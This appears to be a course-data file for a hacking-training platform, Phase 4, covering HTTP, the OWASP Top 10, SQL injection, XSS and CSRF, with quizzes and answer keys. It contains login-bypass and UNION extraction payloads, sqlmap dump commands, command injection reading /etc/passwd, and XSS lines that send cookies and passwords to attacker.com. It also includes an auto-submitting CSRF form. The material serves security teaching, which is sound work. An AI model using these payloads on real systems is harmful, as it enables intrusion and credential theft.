    // ── PHASE 4: WEB & BACKEND SYSTEMS (moduleId: 4, 5 rooms) ───────────────
    {
      id: 'phase4',
      title: 'Web & Backend Systems',
      codename: 'PHASE 4',
      color: PHASE_COLORS.phase4,
      rooms: [
        {
          id: 'room1',
          title: 'How the Web Works',
          overview:
            "Before you can dismantle a web application, you must understand the invisible architecture that supports it. To train like a hacker is to see the web not as a collection of pages, but as a series of stateless HTTP requests and responses. In this room, you will learn to intercept, read, and manipulate the raw data that flows between the browser and the Qyvora backend.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Client-Server Model',
              instruction: `Every website follows the same pattern.

**Simple flow:**

\`\`\`
1. You type: website.com
2. Browser sends request to server
3. Server sends back HTML/CSS/JS
4. Browser displays the page
\`\`\`

**What's really happening:**

\`\`\`bash
# Your browser sends:
GET / HTTP/1.1
Host: website.com
User-Agent: Mozilla/5.0
\`\`\`

**Server responds:**

\`\`\`bash
HTTP/1.1 200 OK
Content-Type: text/html

<html>
  <body>Website content</body>
</html>
\`\`\`

**Why this matters:**

Understanding requests helps you:
- Modify data being sent
- Bypass client-side validation
- Test APIs directly`,
              image: null,
            },
            {
              title: 'HTTP Methods',
              instruction: `Different ways to interact with servers.

**GET - Retrieve data:**

\`\`\`bash
curl http://target.com/page?id=1
# Data in URL (visible)
\`\`\`

**POST - Send data:**

\`\`\`bash
curl -X POST http://target.com/login \\
  -d "username=admin&password=test"
# Data in body (not in URL)
\`\`\`

**PUT - Update:**

\`\`\`bash
curl -X PUT http://target.com/user/1 \\
  -d '{"name":"newname"}'
\`\`\`

**DELETE - Remove:**

\`\`\`bash
curl -X DELETE http://target.com/user/1
\`\`\`

**Why hackers care:**

\`\`\`bash
# Change GET to POST to bypass filters
# Try PUT/DELETE on endpoints
# Test methods not intended by developers
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r1-q1',
                  question: 'Which HTTP method is used to retrieve data?',
                  options: ['POST', 'GET', 'DELETE', 'PUT'],
                  correctIndex: 1,
                  explanation: 'GET retrieves data from the server. POST sends data, PUT updates, and DELETE removes data.'
                },
                {
                  id: 'p4r1-q1a',
                  question: "When you open a website, which side runs the code that talks to the database?",
                  options: [
                    "Your browser",
                    "Your router",
                    "The server (the backend)",
                    "The keyboard you type on"
                  ],
                  correctIndex: 2,
                  explanation: "Your browser (the client) shows the page and sends requests. The server runs the backend code, applies the rules and holds the data. A hacker's main target is usually the server, because that is where the valuable data lives."
                },
                {
                  id: 'p4r1-q1b',
                  question: "A shop checks that the quantity field is a positive number only with JavaScript in the browser. Why is that a weakness?",
                  options: [
                    "Browsers refuse to send negative numbers",
                    "JavaScript checks are always encrypted",
                    "The server fixes bad values by itself",
                    "An attacker controls their own browser and can send a different value straight to the server, so the server must check too"
                  ],
                  correctIndex: 3,
                  explanation: "Anything running in the browser can be bypassed, because the client belongs to the user. Browser checks are only for convenience. Real security checks must happen on the server."
                }
              ]
            },
            {
              title: 'Cookies and Sessions',
              instruction: `How websites remember you.

**Cookies are small data stored in your browser:**

\`\`\`bash
# Server sets cookie
Set-Cookie: session=abc123; Path=/

# Browser sends it back
Cookie: session=abc123
\`\`\`

**View cookies:**

\`\`\`bash
# In curl
curl -v http://target.com

# Look for:
# < Set-Cookie: sessionid=...
\`\`\`

**Session attacks:**

\`\`\`bash
# Steal someone's cookie
Cookie: session=STOLEN_VALUE

# Now you're logged in as them!
\`\`\`

**Common cookie flags:**

\`\`\`
HttpOnly   - JavaScript can't access (prevents XSS theft)
Secure     - Only sent over HTTPS
SameSite   - CSRF protection
\`\`\`

**Test cookies:**

\`\`\`bash
# Send custom cookie
curl -b "session=test123" http://target.com

# See if weak session IDs
# session=1, session=2, session=3 = predictable!
\`\`\``,
              image: null,
            },
            {
              title: 'Headers',
              instruction: `HTTP headers contain important metadata.

**Common request headers:**

\`\`\`
User-Agent: Browser/OS info
Referer: Where you came from
Authorization: Login tokens
Cookie: Session data
\`\`\`

**Common response headers:**

\`\`\`
Server: Apache/2.4.41 (leaks version!)
X-Powered-By: PHP/7.4 (leaks tech stack!)
Set-Cookie: Session management
Content-Type: text/html
\`\`\`

**View all headers:**

\`\`\`bash
curl -I http://target.com
\`\`\`

**Custom headers:**

\`\`\`bash
curl -H "User-Agent: GoogleBot" http://target.com
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
\`\`\`

**Why this matters:**

\`\`\`bash
# Leak info
Server: Apache/2.4.41
# Search for: Apache 2.4.41 exploits

# Bypass IP blocks
X-Forwarded-For: 127.0.0.1

# Pretend to be mobile
User-Agent: iPhone...
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r1-q2',
                  question: 'What can the "Server" header reveal?',
                  options: ['Nothing useful', 'Server software version (useful for finding exploits)', 'User passwords', 'Cookie values'],
                  correctIndex: 1,
                  explanation: 'The Server header reveals the web server software and version, helping attackers find known vulnerabilities for that specific version.'
                },
                {
                  id: 'p4r1-q2a',
                  question: "A tester finds that DELETE /api/users/15 works even when not logged in. What is the problem?",
                  options: [
                    "Anyone can delete user accounts, because the server is not checking who is allowed to do it",
                    "Nothing, DELETE is harmless",
                    "The method should be GET instead",
                    "The server is using HTTPS the wrong way"
                  ],
                  correctIndex: 0,
                  explanation: "DELETE removes data, so the server must make sure only authorized users can use it. Testing which methods a URL allows, and who can use them, is a basic part of web testing."
                },
                {
                  id: 'p4r1-q2b',
                  question: "A site deletes your account when you open a plain link that uses the GET method. Why is that a bad design?",
                  options: [
                    "GET is slower than POST",
                    "GET should not change data, and any link, image or page prefetch could trigger it by accident or on purpose",
                    "GET cannot be used with HTTPS",
                    "Links cannot contain account names"
                  ],
                  correctIndex: 1,
                  explanation: "GET is meant for reading. If a GET link makes a change, someone can trick your browser into opening it. Actions that change data should use POST, PUT or DELETE, with protection against forged requests."
                }
              ]
            },
            {
              title: 'Status Codes',
              instruction: `HTTP status codes tell you what happened.

**Success (2xx):**

\`\`\`
200 - OK (page loaded)
201 - Created (resource made)
\`\`\`

**Redirection (3xx):**

\`\`\`
301 - Moved permanently
302 - Temporary redirect
\`\`\`

**Client errors (4xx):**

\`\`\`
400 - Bad request
401 - Unauthorized (need login)
403 - Forbidden (no access)
404 - Not found
\`\`\`

**Server errors (5xx):**

\`\`\`
500 - Internal server error
502 - Bad gateway
503 - Service unavailable
\`\`\`

**Testing:**

\`\`\`bash
# Check status
curl -I http://target.com

# 403 Forbidden on /admin?
# Try variations:
curl -I http://target.com/ADMIN
curl -I http://target.com/admin..
curl -I http://target.com/admin/
\`\`\`

**Why status codes matter:**

\`\`\`
403 = exists but blocked
404 = doesn't exist
401 = authentication possible
\`\`\``,
              image: null,
            },
            {
              title: 'Web Proxies',
              instruction: `Intercept and modify HTTP traffic.

**Burp Suite - Most popular:**

\`\`\`
1. Start Burp proxy
2. Configure browser to use proxy
3. Intercept requests
4. Modify and forward
\`\`\`

**Command-line proxy:**

\`\`\`bash
# Use with curl
curl -x http://127.0.0.1:8080 http://target.com

# Use with all tools
export HTTP_PROXY=http://127.0.0.1:8080
\`\`\`

**What you can do:**

- Change POST data before sending
- Modify cookies
- Add/remove headers
- Replay requests
- Test injection payloads

**Example attack:**

\`\`\`
1. Login form says: price=100
2. Intercept with Burp
3. Change to: price=1
4. Forward request
5. Buy item for $1 instead of $100
\`\`\`

> Proxies let you control exactly what gets sent to the server.`,
              image: null,
              quiz: [
                {
                  id: 'p4r1-q3',
                  question: 'What is the purpose of a web proxy like Burp Suite?',
                  options: ['Speed up browsing', 'Intercept and modify HTTP requests/responses', 'Block advertisements', 'Encrypt traffic'],
                  correctIndex: 1,
                  explanation: 'A web proxy sits between your browser and the server, letting you intercept, view, and modify HTTP traffic in real-time.'
                },
                {
                  id: 'p4r1-q3a',
                  question: "What does a session cookie do?",
                  options: [
                    "It stores your password in plain text",
                    "It makes the website load faster",
                    "It holds an ID that tells the server which logged-in user you are",
                    "It blocks hackers from the site"
                  ],
                  correctIndex: 2,
                  explanation: "HTTP forgets you after each request, so the site gives you a session ID in a cookie. Your browser sends it back every time, and that is how the server knows you are still logged in."
                },
                {
                  id: 'p4r1-q3b',
                  question: "Why is an easy-to-guess session ID dangerous?",
                  options: [
                    "It makes the cookie expire",
                    "It makes the server crash",
                    "It only affects the speed of the site",
                    "Anyone who guesses or steals it can act as that user, which is called session hijacking"
                  ],
                  correctIndex: 3,
                  explanation: "The session ID works like a temporary password. Good sites use long random IDs, send them only over HTTPS and mark them HttpOnly so scripts cannot read them."
                }
              ]
            }
          ],
        },
        {
          id: 'room2',
          title: 'OWASP Top 10 Overview',
          overview:
            "The OWASP Top 10 is the definitive list of the most critical web security risks. As an Qyvora operative, you must know these categories by heart. This room takes you beyond the definitions, showing you how to detect and demonstrate the impact of each vulnerability using professional tools and techniques.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'What is OWASP Top 10?',
              instruction: `The standard list of critical web vulnerabilities.

**OWASP = Open Web Application Security Project**

They publish the Top 10 most dangerous web vulnerabilities every few years.

**Why it matters:**

- Industry standard
- Used in compliance (PCI-DSS, etc.)
- What bug bounties pay for
- What pentesters look for

**The list changes as tech evolves:**

\`\`\`
2017: XSS was #7
2021: XSS dropped to #3 (because it's everywhere)
New: Insecure Design (2021)
\`\`\`

> Knowing OWASP Top 10 = knowing what to test.`,
              image: null,
            },
            {
              title: '#1 - Broken Access Control',
              instruction: `Users accessing things they shouldn't.

**Examples:**

\`\`\`
View someone else's profile:
/user/profile?id=100  → Change to id=101

Access admin panel:
/admin (normally blocked)  → Try /admin/ or /ADMIN

Download any file:
/download?file=invoice1.pdf  → Try file=../../etc/passwd
\`\`\`

**Quick test:**

\`\`\`bash
# Try accessing resources directly
curl http://target.com/admin
curl http://target.com/api/users/1
curl http://target.com/api/users/2
\`\`\`

**Prevention:**

- Check permissions on every request
- Don't trust client-side checks
- Use server-side authorization`,
              image: null,
              quiz: [
                {
                  id: 'p4r2-q1',
                  question: 'What is an example of Broken Access Control?',
                  options: ['Slow website', 'Viewing another user\'s data by changing an ID in the URL', 'Forgotten password', 'CSS styling error'],
                  correctIndex: 1,
                  explanation: 'Broken Access Control means users can access resources they should not have permission to view, like changing ?id=1 to ?id=2 to see someone else\'s data.'
                },
                {
                  id: 'p4r2-q1a',
                  question: "A response header says Server: Apache/2.2.8. Why does this help a tester?",
                  options: [
                    "It shows the software and version, which can be checked for known vulnerabilities",
                    "It gives the admin password",
                    "It proves the site is secure",
                    "It shows who visited the site"
                  ],
                  correctIndex: 0,
                  explanation: "Headers carry information about the request or response. Version details help you decide what to test, and that is why many sites hide or shorten them."
                },
                {
                  id: 'p4r2-q1b',
                  question: "Which header carries your session cookie from the browser to the server on each request?",
                  options: [
                    "Server",
                    "Cookie",
                    "Content-Type",
                    "Host"
                  ],
                  correctIndex: 1,
                  explanation: "The server gives you the cookie with a Set-Cookie header, and your browser returns it in the Cookie header every time. Testers often look at this header to see how sessions are handled."
                }
              ]
            },
            {
              title: '#2 - Cryptographic Failures',
              instruction: `Weak or missing encryption.

**Common mistakes:**

\`\`\`
❌ Passwords stored in plaintext
❌ Using MD5/SHA1 (broken algorithms)
❌ HTTP instead of HTTPS
❌ Weak SSL/TLS configuration
\`\`\`

**Testing:**

\`\`\`bash
# Check if HTTPS enforced
curl http://target.com
# Does it redirect to https?

# Check SSL strength
nmap --script ssl-enum-ciphers -p 443 target.com

# Look for leaked passwords
curl http://target.com/backup.sql
\`\`\`

**What to look for:**

- Unencrypted sensitive data
- Weak password hashing
- Missing HTTPS
- Exposed keys/tokens`,
              image: null,
            },
            {
              title: '#3 - Injection',
              instruction: `Injecting malicious code into applications.

**Types of injection:**

\`\`\`bash
# SQL Injection
' OR '1'='1

# Command Injection
; ls -la

# LDAP Injection
*)(uid=*)

# XPath Injection
' or '1'='1
\`\`\`

**SQL Injection example:**

\`\`\`bash
# Normal login
username=admin&password=test

# Injection
username=admin' OR '1'='1'--&password=anything
\`\`\`

**Command Injection:**

\`\`\`bash
# Vulnerable parameter
ping -c 1 192.168.1.1

# Inject command
ping -c 1 192.168.1.1; cat /etc/passwd
\`\`\`

**Test for injection:**

Try special characters: \`' " ; | & < > ( ) { }\``,
              image: null,
              quiz: [
                {
                  id: 'p4r2-q2',
                  question: 'What does SQL Injection allow an attacker to do?',
                  options: ['Change CSS styling', 'Directly interact with the database', 'Speed up queries', 'Fix bugs'],
                  correctIndex: 1,
                  explanation: 'SQL Injection lets attackers insert malicious SQL code to read, modify, or delete database data, often bypassing authentication.'
                },
                {
                  id: 'p4r2-q2a',
                  question: "What is the difference between authentication and authorization?",
                  options: [
                    "Authentication checks what you can do, and authorization checks who you are",
                    "They mean the same thing",
                    "Authentication checks who you are, and authorization checks what you are allowed to do",
                    "Authentication is for passwords and authorization is for emails"
                  ],
                  correctIndex: 2,
                  explanation: "Logging in proves your identity (authentication). After that, the server must still decide which data and actions you may use (authorization). Many serious bugs are missing authorization checks."
                },
                {
                  id: 'p4r2-q2b',
                  question: "A login page says User not found for a wrong username, and Wrong password for a wrong password. Why is that a weakness?",
                  options: [
                    "It makes logging in slower",
                    "It reveals the admin password",
                    "It breaks the cookie",
                    "It lets an attacker find out which usernames exist"
                  ],
                  correctIndex: 3,
                  explanation: "Different messages let an attacker test names until they find real accounts, and then they only need to guess the passwords. A safer message is the same for both cases, such as Invalid username or password."
                }
              ]
            },
            {
              title: '#4 - Insecure Design',
              instruction: `Flaws in the application design itself.

**Examples:**

**1. Password reset without verification:**
\`\`\`
Reset password → Only asks username
No email verification
No security questions
\`\`\`

**2. Rate limiting missing:**
\`\`\`bash
# Unlimited login attempts
for i in {1..10000}; do
  curl -d "user=admin&pass=$i" http://target.com/login
done
\`\`\`

**3. Trusting client-side:**
\`\`\`html
<input type="hidden" name="price" value="100">
<!-- Attacker changes to value="1" -->
\`\`\`

**How to identify:**

- Think about business logic
- What could go wrong?
- What did developers assume?

**Prevention:**

- Threat modeling during design
- Security requirements upfront
- Don't rely on client-side validation`,
              image: null,
            },
            {
              title: 'Testing Approach',
              instruction: `How to systematically test for OWASP Top 10.

**1. Map the application:**

\`\`\`bash
# Find all endpoints
burp crawler
# or
gospider -s http://target.com
\`\`\`

**2. Test each vulnerability type:**

\`\`\`bash
# Access Control
# Try accessing admin pages, other users' data

# Injection
# Add ' " ; to all inputs

# Authentication
# Test password reset, session handling

# XSS
# Try <script>alert(1)</script> everywhere
\`\`\`

**3. Use automated scanners:**

\`\`\`bash
# But don't rely on them alone!
nikto -h http://target.com
sqlmap -u "http://target.com/page?id=1"
\`\`\`

**4. Manual testing finds more:**

- Business logic flaws
- Complex attack chains
- Context-specific issues

> Automated + Manual = Complete testing`,
              image: null,
              quiz: [
                {
                  id: 'p4r2-q3',
                  question: 'Why is manual testing important alongside automated scanners?',
                  options: ['Manual testing is faster', 'Manual testing finds business logic flaws and complex issues that scanners miss', 'Scanners don\'t work', 'Manual testing is required by law'],
                  correctIndex: 1,
                  explanation: 'Automated scanners miss business logic flaws, complex attack chains, and context-specific vulnerabilities. Manual testing is essential for thorough assessment.'
                },
                {
                  id: 'p4r2-q3a',
                  question: "GET /api/users/5 shows your profile. You change 5 to 6 and see another person's profile. What is the problem?",
                  options: [
                    "The API does not check that you are allowed to view that user, which is broken access control",
                    "That is normal behavior",
                    "The profile page is slow",
                    "The URL is too short"
                  ],
                  correctIndex: 0,
                  explanation: "The server should check that the logged-in user owns the data they ask for. Changing IDs in endpoints is one of the first things testers try on an API. Test only systems you are allowed to test."
                },
                {
                  id: 'p4r2-q3b',
                  question: "Why do testers look for hidden or undocumented API endpoints?",
                  options: [
                    "They always run faster",
                    "They are often less protected than the ones the app normally uses",
                    "They are required for HTTPS",
                    "They cannot be attacked"
                  ],
                  correctIndex: 1,
                  explanation: "Developers sometimes leave old, test or admin endpoints with weaker checks. These are easy to forget when everyone focuses on the visible ones."
                }
              ]
            }
          ],
        },
        {
          id: 'room3',
          title: 'SQL Injection',
          overview:
            "SQL Injection (SQLi) is the 'Skeleton Key' of web exploitation. It allows an Qyvora operative to step past the front door and talk directly to the database. In this room, you will learn to dismantle queries from the inside out, bypassing authentication and extracting the crown jewels of the Qyvora target: the user credentials.",
          estimatedMinutes: 45,
          steps: [
            {
              title: 'How SQL Injection Works',
              instruction: `SQL databases store all website data: users, passwords, content.

**Normal SQL query:**

\`\`\`sql
SELECT * FROM users WHERE username='admin' AND password='pass123'
\`\`\`

**What happens:**

\`\`\`
User types: admin / pass123
Query runs: SELECT * FROM users WHERE username='admin' AND password='pass123'
If match found: Login success
If no match: Login failed
\`\`\`

**SQL Injection:**

\`\`\`sql
User types: admin' OR '1'='1
Query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''
\`\`\`

**Why it works:**

\`\`\`
'1'='1' is always true
OR means "either condition"
Result: Query returns all users
You're logged in as first user (usually admin)
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r3-q1',
                  question: 'Why does \' OR \'1\'=\'1 bypass login?',
                  options: ['It deletes the database', 'It makes the WHERE condition always true', 'It encrypts the password', 'It creates a new user'],
                  correctIndex: 1,
                  explanation: 'OR \'1\'=\'1 creates a condition that is always true, making the query return all users and bypassing the password check.'
                },
                {
                  id: 'p4r3-q1a',
                  question: "What does SELECT * FROM users WHERE id = 5 do?",
                  options: [
                    "Deletes user 5",
                    "Creates a new user with id 5",
                    "Gets all the columns for the user whose id is 5",
                    "Changes the password of user 5"
                  ],
                  correctIndex: 2,
                  explanation: "SELECT reads data. The * means all columns, FROM names the table and WHERE filters the rows. Understanding normal queries is the first step to understanding how they can be abused."
                },
                {
                  id: 'p4r3-q1b',
                  question: "Where is data such as usernames and password hashes stored on most websites?",
                  options: [
                    "Only in your browser cookies",
                    "In the URL",
                    "In your router",
                    "In a database on the server"
                  ],
                  correctIndex: 3,
                  explanation: "The backend keeps account data in database tables. That makes the database a main target, so any bug that lets users change a database query is serious."
                }
              ]
            },
            {
              title: 'Finding SQL Injection',
              instruction: `Test for SQLi with simple payloads.

**Step 1: Try a single quote:**

\`\`\`bash
# Normal
curl "http://target.com/page?id=1"

# Test
curl "http://target.com/page?id=1'"
\`\`\`

**If you see SQL error = vulnerable!**

\`\`\`
Error: You have an error in your SQL syntax...
\`\`\`

**Step 2: Test true/false:**

\`\`\`bash
# True condition
curl "http://target.com/page?id=1' AND '1'='1"
# Shows normal page

# False condition  
curl "http://target.com/page?id=1' AND '1'='2"
# Shows different page or error

# Different responses = SQL injection confirmed
\`\`\`

**Common injection points:**

\`\`\`
Login forms
Search boxes
URL parameters (?id=1)
Cookie values
HTTP headers
\`\`\``,
              image: null,
            },
            {
              title: 'Bypassing Login',
              instruction: `Common SQLi payloads for authentication bypass.

**Basic bypasses:**

\`\`\`sql
admin' OR '1'='1'--
admin'--
' OR '1'='1'--
' OR 1=1--
admin' #
\`\`\`

**Why they work:**

\`\`\`sql
-- is SQL comment (ignores rest)
# is MySQL comment

Original: WHERE username='INPUT' AND password='INPUT2'
Becomes:  WHERE username='admin'--' AND password='INPUT2'
Result:   WHERE username='admin'
(Password check is commented out!)
\`\`\`

**Testing:**

\`\`\`bash
# Try in username field
curl -d "username=admin'--&password=anything" http://target.com/login

# Try in password field  
curl -d "username=admin&password=' OR '1'='1'--" http://target.com/login
\`\`\`

**Different databases:**

\`\`\`sql
MySQL:    -- or #
PostgreSQL: --
SQL Server: --
Oracle:   --
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r3-q2',
                  question: 'What does -- do in SQL injection?',
                  options: ['Deletes data', 'Comments out the rest of the query', 'Encrypts the query', 'Creates a backup'],
                  correctIndex: 1,
                  explanation: '-- is a SQL comment that ignores everything after it, allowing attackers to remove parts of the query like password checks.'
                },
                {
                  id: 'p4r3-q2a',
                  question: "A search box builds its SQL query by pasting the user's text into it. What is the root cause of SQL injection?",
                  options: [
                    "User input is mixed into the query as code instead of being treated only as data",
                    "The database is too old",
                    "The website uses HTTPS",
                    "The search box is too small"
                  ],
                  correctIndex: 0,
                  explanation: "When the input becomes part of the command, a user can change what the query does. The fix is to keep code and data separate."
                },
                {
                  id: 'p4r3-q2b',
                  question: "Which defense best stops SQL injection?",
                  options: [
                    "Hiding the error messages only",
                    "Prepared statements (parameterized queries)",
                    "Blocking the word SELECT only",
                    "Making the form look different"
                  ],
                  correctIndex: 1,
                  explanation: "A prepared statement sends the query and the input separately, so the input can never turn into SQL. Hiding errors or blocking words only makes attacks a little harder, and they are easy to work around."
                }
              ]
            },
            {
              title: 'Extracting Data',
              instruction: `Pull data from the database using UNION.

**UNION combines query results:**

\`\`\`sql
SELECT name FROM products WHERE id=1
UNION
SELECT password FROM users
\`\`\`

**Step 1: Find number of columns:**

\`\`\`sql
' ORDER BY 1--  # No error
' ORDER BY 2--  # No error
' ORDER BY 3--  # Error!
# So there are 2 columns
\`\`\`

**Step 2: Use UNION:**

\`\`\`sql
' UNION SELECT NULL,NULL--
# Try different column counts until no error
\`\`\`

**Step 3: Extract data:**

\`\`\`sql
# Get database version
' UNION SELECT NULL,@@version--

# Get table names
' UNION SELECT NULL,table_name FROM information_schema.tables--

# Get user data
' UNION SELECT username,password FROM users--
\`\`\`

**Practical example:**

\`\`\`bash
curl "http://target.com/product?id=1' UNION SELECT username,password FROM users--"
\`\`\``,
              image: null,
            },
            {
              title: 'Using SQLMap',
              instruction: `Automate SQL injection with sqlmap.

**Basic scan:**

\`\`\`bash
sqlmap -u "http://target.com/page?id=1"
\`\`\`

**Get databases:**

\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
\`\`\`

**Get tables:**

\`\`\`bash
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
\`\`\`

**Dump data:**

\`\`\`bash
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
\`\`\`

**POST request:**

\`\`\`bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
\`\`\`

**From Burp request:**

\`\`\`bash
# Save request to file
sqlmap -r request.txt
\`\`\`

**Helpful flags:**

\`\`\`bash
--batch        # Don't ask questions
--threads 5    # Speed up
--level 3      # More thorough
--risk 2       # More tests
\`\`\`

> SQLMap automates but understand manual injection first!`,
              image: null,
              quiz: [
                {
                  id: 'p4r3-q3',
                  question: 'What is the advantage of using SQLMap?',
                  options: ['It is required by law', 'It automates the detection and exploitation of SQL injection', 'It fixes the vulnerability', 'It encrypts the database'],
                  correctIndex: 1,
                  explanation: 'SQLMap automates the tedious process of detecting and exploiting SQL injection, testing multiple techniques and extracting data automatically.'
                },
                {
                  id: 'p4r3-q3a',
                  question: "A comment box shows whatever users type without cleaning it. What could an attacker's comment do?",
                  options: [
                    "Delete the database directly",
                    "Shut down the server",
                    "Contain a script that runs in every visitor's browser, for example to steal session cookies",
                    "Change the visitors' Wi-Fi password"
                  ],
                  correctIndex: 2,
                  explanation: "This is cross-site scripting (XSS). The attacker's code runs inside the trusted site, so it can read page data and act as the visitor."
                },
                {
                  id: 'p4r3-q3b',
                  question: "Which is the best defense against XSS?",
                  options: [
                    "Make the page load faster",
                    "Hide the comment box",
                    "Ask users to log in twice",
                    "Encode user input when showing it, so it appears as text and never runs as code"
                  ],
                  correctIndex: 3,
                  explanation: "Output encoding turns characters like < and > into harmless text. A Content Security Policy adds another layer by limiting which scripts the browser may run."
                }
              ]
            },
            {
              title: 'Prevention',
              instruction: `How to prevent SQL injection.

**#1 - Use Prepared Statements:**

\`\`\`python
# ❌ Vulnerable
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)

# ✅ Safe
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
\`\`\`

**Why it works:**

\`\`\`
Prepared statements separate:
- SQL code
- User data

Database knows: username is DATA, not CODE
Injection impossible
\`\`\`

**Other defenses:**

\`\`\`bash
# Input validation
if username matches /^[a-zA-Z0-9]+$/:
    allowed
else:
    rejected

# Least privilege
Database user can only SELECT, not DELETE

# WAF (Web Application Firewall)
Block known injection patterns
\`\`\`

**But remember:**

\`\`\`
Only prepared statements fully prevent SQLi
Everything else can be bypassed
\`\`\``,
              image: null,
            }
          ],
        },
        {
          id: 'room4',
          title: 'XSS & CSRF',
          overview:
            "The browser is the most dangerous environment in the digital world. In this room, you will master client-side exploitation, learning how to execute your own code in the context of other users' browsers (XSS) and trick them into performing actions they never intended (CSRF). To train like a hacker is to weaponize the very trust that the web is built on.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'What is XSS?',
              instruction: `Cross-Site Scripting = Injecting JavaScript into websites.

**How it works:**

\`\`\`html
<!-- User input displayed without sanitization -->
Search for: <script>alert('XSS')</script>

<!-- Browser executes the script -->
Result: Alert box pops up
\`\`\`

**Why it's dangerous:**

\`\`\`javascript
// Steal cookies
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

// Steal passwords
<script>
  document.forms[0].onsubmit=function(){
    fetch('http://attacker.com/steal?p='+password.value)
  }
</script>

// Redirect user
<script>window.location='http://evil.com'</script>
\`\`\`

**Real impact:**

- Session hijacking
- Credential theft
- Malware distribution
- Phishing`,
              image: null,
              quiz: [
                {
                  id: 'p4r4-q1',
                  question: 'What does XSS allow an attacker to do?',
                  options: ['Delete the database', 'Execute JavaScript in victim\'s browser', 'Scan ports', 'Crack passwords'],
                  correctIndex: 1,
                  explanation: 'XSS (Cross-Site Scripting) lets attackers inject malicious JavaScript that runs in other users\' browsers, stealing data or performing actions as them.'
                },
                {
                  id: 'p4r4-q1a',
                  question: "You are logged into your bank in one tab. A harmful page in another tab secretly sends a transfer request. Why might the bank accept it?",
                  options: [
                    "Your browser automatically attaches your session cookie to the request",
                    "The bank turned off passwords",
                    "The harmful page knows your password",
                    "HTTPS was broken"
                  ],
                  correctIndex: 0,
                  explanation: "This is cross-site request forgery (CSRF). The server sees a valid cookie and cannot tell that you did not mean to send the request."
                },
                {
                  id: 'p4r4-q1b',
                  question: "Which defense helps stop CSRF?",
                  options: [
                    "Using only longer passwords",
                    "A secret random token in each form that the server checks",
                    "Using HTTPS alone",
                    "Turning off images"
                  ],
                  correctIndex: 1,
                  explanation: "An attacker's page cannot know the secret token, so its forged request fails. HTTPS protects traffic on the way, but it does not stop forged requests."
                }
              ]
            },
            {
              title: 'Types of XSS',
              instruction: `Three main types of Cross-Site Scripting.

**1. Reflected XSS (Non-persistent):**

\`\`\`bash
# Payload in URL
http://target.com/search?q=<script>alert(1)</script>

# Victim clicks malicious link
# Script runs once in their browser
\`\`\`

**2. Stored XSS (Persistent):**

\`\`\`html
<!-- Post comment with script -->
Comment: <script>alert(document.cookie)</script>

<!-- Stored in database -->
<!-- Runs for EVERY user who views the page -->
\`\`\`

**3. DOM-based XSS:**

\`\`\`html
<!-- JavaScript processes user input -->
<script>
  var search = location.search;
  document.write("You searched: " + search);
</script>

<!-- Exploit -->
?search=<img src=x onerror=alert(1)>
\`\`\`

**Most dangerous:**

Stored XSS > Reflected XSS > DOM-based XSS`,
              image: null,
            },
            {
              title: 'Finding XSS',
              instruction: `Test for XSS vulnerabilities.

**Basic payloads:**

\`\`\`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
\`\`\`

**Test every input:**

\`\`\`bash
# Search box
<script>alert(1)</script>

# URL parameter
?name=<script>alert(1)</script>

# Form fields
username: <script>alert(1)</script>

# Hidden fields (inspect and modify)
<input type="hidden" value="<script>alert(1)</script>">
\`\`\`

**If alert box appears = XSS exists!**

**Advanced payloads:**

\`\`\`html
# Bypass filters
<ScRiPt>alert(1)</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert(1)">
\`\`\`

**Steal session:**

\`\`\`html
<script>
fetch('http://attacker.com/log?cookie='+document.cookie)
</script>
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r4-q2',
                  question: 'Which type of XSS is most dangerous?',
                  options: ['Reflected', 'Stored (affects all users)', 'DOM-based', 'They are all equally dangerous'],
                  correctIndex: 1,
                  explanation: 'Stored XSS is most dangerous because the payload is saved in the database and executes for every user who views the page, not just one victim.'
                },
                {
                  id: 'p4r4-q2a',
                  question: "A site lets you upload a profile picture but does not check the file. What is the main risk?",
                  options: [
                    "The picture may look blurry",
                    "The site may load slowly",
                    "An attacker could upload a script that the server runs, giving them control",
                    "Users may upload duplicate files"
                  ],
                  correctIndex: 2,
                  explanation: "If the server executes an uploaded file, the attacker's code runs on the server. This can lead to full compromise, so upload features are a favorite target."
                },
                {
                  id: 'p4r4-q2b',
                  question: "Which is the safest way to handle uploads?",
                  options: [
                    "Trust the file extension the browser sends",
                    "Check the type only with JavaScript",
                    "Allow all file types and warn users",
                    "Check the type and size on the server, rename the file and store it where it cannot be executed"
                  ],
                  correctIndex: 3,
                  explanation: "Only server-side checks count, because a client can send anything. Renaming the file and storing it away from executable paths adds another layer."
                }
              ]
            },
            {
              title: 'What is CSRF?',
              instruction: `Cross-Site Request Forgery = Tricking users into unwanted actions.

**How it works:**

\`\`\`
1. User logs into bank.com
2. Session cookie saved
3. User visits evil.com (while still logged in)
4. evil.com sends request to bank.com
5. Browser includes session cookie
6. Bank thinks request is legitimate
7. Money transferred!
\`\`\`

**Example attack:**

\`\`\`html
<!-- Evil website contains: -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<!-- When victim views page -->
<!-- Request automatically sent with their cookies -->
<!-- Money transferred without their knowledge -->
\`\`\`

**Why it works:**

Browsers automatically send cookies with requests. The bank can't tell if the request came from:
- The real banking website
- An attacker's malicious page`,
              image: null,
            },
            {
              title: 'CSRF Examples',
              instruction: `Real-world CSRF attack scenarios.

**Change email:**

\`\`\`html
<form action="http://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

